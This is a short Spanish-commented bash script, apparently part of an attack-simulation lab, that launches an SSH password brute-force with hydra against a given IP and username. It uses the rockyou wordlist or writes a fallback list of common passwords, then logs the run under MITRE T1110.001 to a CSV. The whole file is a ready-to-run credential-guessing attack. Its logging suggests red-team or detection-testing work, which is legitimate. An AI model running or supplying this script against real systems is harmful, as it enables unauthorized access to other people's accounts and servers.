#!/usr/bin/env bash
# Ataque 1: Fuerza bruta SSH (MITRE T1110.001)
# Uso: ./attack1_bruteforce_ssh.sh <IP_OBJETIVO> <USUARIO> [WORDLIST]
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP_OBJETIVO> <USUARIO> [WORDLIST]}"
USER="${2:?Falta usuario}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
[ -f "$WORDLIST" ] || WORDLIST="/tmp/wordlist_bf.txt"
[ -f "$WORDLIST" ] || printf "123456\npassword\nadmin123\nletmein\nqwerty\nP@ssw0rd\n" > "$WORDLIST"

INICIO=$(log_inicio)
echo "[+] Ejecutando fuerza bruta SSH contra ${TARGET} usuario ${USER}..."
hydra -l "${USER}" -P "${WORDLIST}" -t 4 -f "ssh://${TARGET}" -o "/tmp/hydra_ssh_$(date +%s).log" || true
log_fin "bruteforce_ssh" "T1110.001" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
